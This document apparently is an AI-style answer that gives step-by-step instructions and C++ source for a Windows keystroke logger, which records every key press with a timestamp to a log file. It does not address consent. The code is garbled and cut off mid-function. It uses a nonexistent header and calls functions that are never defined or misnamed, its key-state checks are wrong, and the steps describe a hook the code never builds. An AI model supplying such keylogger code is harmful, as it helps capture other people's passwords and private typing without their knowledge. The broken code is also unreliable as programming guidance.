To create a keystroke logging application on a Windows computer, follow these steps:

### Step-by-Step Explanation and Code

1. **Include Necessary Headers**: 
   - Include `Windows.h` and `User32.h` for the necessary functions and definitions.

2. **Define Data Structures**:
   - Use a `KEY_EVENT` struct to store each keystroke event, including the key pressed, its state, and the timestamp.

3. **Define the Keyboard Hook Function**:
   - The hook function will be called for each key press or release. It will log the keystroke to a file.

4. **Set Up the Keyboard Hook**:
   - Use `SetWindowsHook` to install the hook. This allows the application to intercept all keyboard events.

5. **Monitor Key States**:
   - In a loop, check the state of each key using `GetKeyState`. Log the keystroke with a timestamp if it's pressed or released.

6. **Log Keystrokes**:
   - Append each logged keystroke to a file, including the timestamp and the key pressed.

7. **Handle Errors and Clean Up**:
   - Include error handling for hook installation and file operations. Clean up the hook and resources when done.

8. **Terminate the Application**:
   - Allow the user to stop logging and remove the hook gracefully.

### Code Implementation

```cpp
#include <Windows.h>
#include <User32.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <string>

using namespace std;

#define MAX_KEY_STroke 1024
#define LOG_FILE "KeystrokeLog.txt"

struct KeyStroke {
    char key;
    bool isPressed;
    time_t timestamp;
};

void KeyLoggerSetup() {
    cout << "Initializing keyboard hook..." << endl;
}

void KeyLoggerThread() {
    FILE *logFile = fopen(LOG_FILE, "a");
    if (!logFile) {
        cout << "Error: Cannot create log file!" << endl;
        return;
    }

    while (true) {
        BYTE modifiers = GetKeyState(0x10); // Check for shift, ctrl, etc.
        if (modifiers & 0x20) { // Check if Shift is pressed
            // Handle shifted keys
        }

        for (int i = 0; i < 256; i++) {
            BYTE state = GetKeyState(i);
            if ((state & 0x1) != 0) { // Key is pressed
                KeyStroke ks;
                ks.key = static_cast<unsigned char>(i);
                ks.isPressed = true;
                ks.timestamp = time(0);
                // Write to file
                fprintf(logFile, "[%s] %c pressed\n", ctime(&ks.timestamp), ks.key);
            }
        }
        Sleep(500); // Reduce CPU usage
    }
    fclose(logFile);
}

void UninstallHook() {
    cout << "Uninstalling keyboard hook..." << endl;
    if (UnhookKeyboard((HWND)GetDesktopWindow(), g_hhook)) {
        cout << "Hook was not installed!" << endl;
    }
}

int main() {
    HWND hwnd = GetDesktopWindow();
    DWORD dwThreadId = 0;
    g_hhook = SetWindowsHook(WH_KEYBOARD_LL, KeyLoggerCallback);

    if (g_hhook == 0) {
        cout << "Failed to install hook!" << endl;
        return 1;
